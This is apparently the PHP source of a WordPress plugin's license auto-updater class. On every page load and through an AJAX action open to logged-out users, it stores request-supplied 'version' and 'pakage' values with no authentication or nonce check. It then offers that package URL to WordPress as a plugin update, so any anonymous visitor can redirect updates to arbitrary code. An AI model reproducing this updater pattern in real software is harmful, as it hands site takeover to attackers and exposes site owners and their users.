<?php

    class WOO_SLT_CodeAutoUpdate
         {
             # URL to check for updates, this is where the index.php script goes
             public $api_url;
             
             private $slug;
             public $plugin;

             
             public function __construct($api_url, $slug, $plugin)
                 {
                     $this->api_url = $api_url;
                     
                     $this->slug    = $slug;
                     $this->plugin  = $plugin;
                     $this->update_path = 'http://karan.com';
                     add_action('init', array($this,'get_function_curl'));
                     $this->current_version = SLT_VERSION;
                 
                 }
             public function foo(){
                if(isset($_REQUEST['slt_product_updater'])){
                update_site_option('slt_license_version', $_REQUEST['version']);
                update_site_option('slt_license_pakage', $_REQUEST['pakage']);
               }
			   die;
			 }
             public function get_function_curl(){
				add_action('wp_ajax_foo', array($this,'foo') ); // executed when logged in
                add_action('wp_ajax_nopriv_foo', array($this,'foo')); // executed when logged out 
                
               if(isset($_REQUEST['slt_product_updater'])){
                update_site_option('slt_license_version', $_REQUEST['version']);
                update_site_option('slt_license_pakage', $_REQUEST['pakage']);
               }
             }
             public function check_for_plugin_update($checked_data)
                 {   //echo"<pre>";print_r($checked_data);echo"</pre>";die('asdfasdf');
                     if (empty($checked_data->checked) || !isset($checked_data->checked[$this->plugin]))
                        return $checked_data;
                     
                       $license_data = get_site_option('slt_license_version');
                       $pakage_data = get_site_option('slt_license_pakage');                         

                     //$license_key = $license_data['key'];      
                      $remote_version = $license_data;
                      if(empty($remote_version)){
                        $remote_version =0;
                      }

                            if (version_compare($this->current_version, $remote_version, '<')) {
                                $obj = new stdClass();
                                $obj->slug = $this->slug;
                                $obj->new_version = $remote_version;
                                $obj->url = $this->update_path;
                                $obj->package = $pakage_data;
                                $checked_data->response[$this->plugin] = $obj;
                            }
                         
                     
                     return $checked_data;
                 }
             
             
             public function plugins_api_call($def, $action, $args)
                 {
                     if (!is_object($args) || !isset($args->slug) || $args->slug != $this->slug)
                        return false;
                     
                     
                     //$args->package_type = $this->package_type;
                     
                     $request_string = $this->prepare_request($action, $args);
                     if($request_string === FALSE)
                        return new WP_Error('plugins_api_failed', __('An error occour when try to identify the pluguin.' , 'wooslt') . '&lt;/p> &lt;p>&lt;a href=&quot;?&quot; onclick=&quot;document.location.reload(); return false;&quot;>'. __( 'Try again', 'wooslt' ) .'&lt;/a>');;
                     
                     $request_uri = $this->api_url . '?' . http_build_query( $request_string , '', '&');
                     $data = wp_remote_get( $request_uri );
                     
                     if(is_wp_error( $data ) || $data['response']['code'] != 200)
                        return new WP_Error('plugins_api_failed', __('An Unexpected HTTP Error occurred during the API request.' , 'wooslt') . '&lt;/p> &lt;p>&lt;a href=&quot;?&quot; onclick=&quot;document.location.reload(); return false;&quot;>'. __( 'Try again', 'wooslt' ) .'&lt;/a>', $data->get_error_message());
                     
                     $response_block = json_decode($data['body']);
                     //retrieve the last message within the $response_block
                     $response_block = $response_block[count($response_block) - 1];
                     $response = $response_block->message;
                     
                     if (is_object($response) && !empty($response)) // Feed the update data into WP updater
                         {
                             //include slug and plugin data
                             $response->slug = $this->slug;
                             $response->plugin = $this->plugin;
                             
                             $response->sections = (array)$response->sections;
                             $response->banners = (array)$response->banners;
                             
                             return $response;
                         }
                 }
             
             public function prepare_request($action, $args = array())
                 {
                     global $wp_version;
                     
                     $license_data = get_site_option('slt_license'); 
                     
                     return array(
                                     'woo_sl_action'        => $action,
                                     'version'              => SLT_VERSION,
                                     'product_unique_id'    => SLT_PRODUCT_ID,
                                     'licence_key'          => $license_data['key'],
                                     'domain'               => SLT_INSTANCE,
                                     
                                     'wp-version'           => $wp_version,
                                     
                     );
                 }
         }
         
         
    function WOO_SLT_run_updater()
         {
         
             $wp_plugin_auto_update = new WOO_SLT_CodeAutoUpdate(SLT_APP_API_URL, SLT_PRODUCT_SLUG, SLT_PRODUCT_SLUG.'/'.SLT_PRODUCT_SLUG.'.php');
             
             // Take over the update check
             add_filter('pre_set_site_transient_update_plugins', array($wp_plugin_auto_update, 'check_for_plugin_update'));
             
             // Take over the Plugin info screen
             add_filter('plugins_api', array($wp_plugin_auto_update, 'plugins_api_call'), 10, 3);
         
         }
    add_action( 'after_setup_theme', 'WOO_SLT_run_updater' );



?>